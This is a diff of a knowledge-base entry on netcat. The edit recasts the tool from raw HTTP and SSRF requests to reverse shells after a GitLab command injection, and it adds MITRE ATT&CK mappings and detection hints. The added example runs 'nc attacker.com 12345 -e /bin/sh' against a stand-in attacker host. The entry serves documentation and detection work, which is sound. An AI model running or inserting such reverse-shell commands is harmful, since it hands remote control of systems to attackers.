@@ -2,16 +2,15 @@
 id: tool-nc-netcat
 url: 'https://nc110.sourceforge.net/'
 tags:
-  - networking
-  - exploitation
+  - network
+  - shell
 type: tool
 verified: false
 platforms:
   - Linux
   - Windows
-  - macOS
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T04:39:10.064Z'
+updated_at: '2025-12-14T17:24:14.975Z'
 validated: true
 submitted: true
 ---
@@ -21,29 +20,30 @@ submitted: true
 
 ## Overview
 
-Netcat (nc) is a versatile networking tool for reading/writing data across TCP/UDP connections, commonly used in security testing for sending raw HTTP requests and payloads.
+Netcat (nc) is a networking utility for reading/writing data across TCP/UDP, commonly used for reverse shells in post-exploitation.
 
 ## Description
 
-In this attack, nc delivers crafted SSRF HTTP requests to the target port 80, enabling minimal payloads without a full HTTP client.
+In this exploit, nc establishes reverse shells from the compromised GitLab server to the attacker's listener after command injection.
 
 ## Features
 
-- Feature 1: Raw TCP/UDP socket manipulation
-- Feature 2: Port scanning and banner grabbing
-- Feature 3: Data piping for scripted attacks
+- Feature 1: TCP/UDP connections
+- Feature 2: Shell execution (-e)
+- Feature 3: Port scanning
 
 ## Installation
 
 ### Requirements
 
-- Standard Unix-like system
+- Standard utilities
 
 ### Install Commands
 
 ```bash
-# On Debian/Ubuntu
-apt install netcat
+# On Ubuntu
+apt install netcat-traditional
+
 # On macOS
 brew install netcat
 ```
@@ -58,23 +58,24 @@ nc --help
 
 | Option | Description |
 |--------|-------------|
-| -v | Verbose output |
-| -n | No DNS resolution |
-| -w 3 | Timeout in seconds |
+| -e | Execute command |
+| -l | Listen mode |
 
 ## Examples
 
 ### Example 1: Basic Usage
 
 ```bash
-nc target-ip 80
+nc -l -p 12345
 ```
+(Listen)
 
 ### Example 2: Advanced Usage
 
 ```bash
-echo "GET / HTTP/1.1\r\n\r\n" | nc target-ip 80
+nc attacker.com 12345 -e /bin/sh
 ```
+(Reverse shell)
 
 ## MITRE ATT&CK Mapping
 
@@ -82,32 +83,28 @@ This tool is commonly associated with:
 
 ### Techniques
 
-- [[PowerShell]] PowerShell
-- [[Network Service Scanning]] Network Service Scanning
+- [[Unix Shell]] Unix Shell
+- [[Encrypted Channel]] Encrypted Channel
 
 ### Tactics
 
 - [[Execution]] Execution
-- [[Discovery]] Discovery
 
 ## Detection
 
 Indicators and methods for detecting this tool's usage:
 
-- Network logs showing raw TCP connections to port 80
-- Unusual echo/netcat processes in process lists
+- Monitor outbound connections on high ports
+- Detect nc process with -e flag
 
 ## Related Procedures
 
-- [[procedures/Trigger-SSRF-with-Crafted-HTTP-Request]]
-- [[procedures/Port-Scan-Internal-Services-via-XSPA]]
+- [[procedures/Verify-Payload-Execution-and-Command-Injection]]
 
 ## Related Tools
 
-- [[tools/curl]]
-- [[tools/nmap]]
+- [[tools/git]]
 
 ## References
 
 - Official documentation: https://nc110.sourceforge.net/
-- Related resources: Netcat man pages
